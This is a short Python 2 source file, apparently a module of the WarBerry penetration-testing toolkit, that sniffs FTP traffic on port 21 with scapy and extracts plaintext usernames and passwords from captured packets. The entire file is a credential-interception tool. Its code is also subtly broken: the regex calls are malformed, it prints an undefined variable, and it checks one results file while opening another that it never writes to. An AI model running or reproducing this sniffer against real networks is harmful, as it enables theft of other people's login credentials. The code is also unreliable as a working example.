from scapy.all import *
from src.utils.console_colors import *

def ftpSniff(pkt):
    if os.path.isfile('../Results/ftpcreds'):
        print bcolors.WARNING + "[!] FTP Creds Results File Exists. Previous Results will be overwritten\n " + bcolors.ENDC
    dest = pkt.getlayer(IP).dst
    raw = pkt.sprintf('%Raw.load%')
    user = re.findall('(?i)USER (.*)'.raw) # username
    passwd = re.findall('(?i)PASS (.*)'.raw) # password
    with open('../Results/mailcreds', 'w') as mailcreds:
        if user:
            print("[*]Detected FTP login to: " + str(dst))
            print("[!] User account: " + str(user[0]))
        elif passwd:
            print("[!] Password: " + str(passwd[0]))

def ftp_creds(iface, expire):
    print " "
    print bcolors.OKGREEN + "      [ FTP INFO SNIFFER MODULE ]\n" + bcolors.ENDC
    print '[*] Sniffing for %d seconds...' %expire
    print 'Interface: %s' % iface
    sniff(filter='tcp port 21', prn=ftpSniff, timeout=expire, iface=iface) # port 21 = FTP port
    print bcolors.OKGREEN + "[+] " + bcolors.ENDC + "Capture Completed." + bcolors.ENDC + " Results saved at " + bcolors.OKGREEN + "../WarBerry/Results/ftpcreds!\n" + bcolors.ENDC
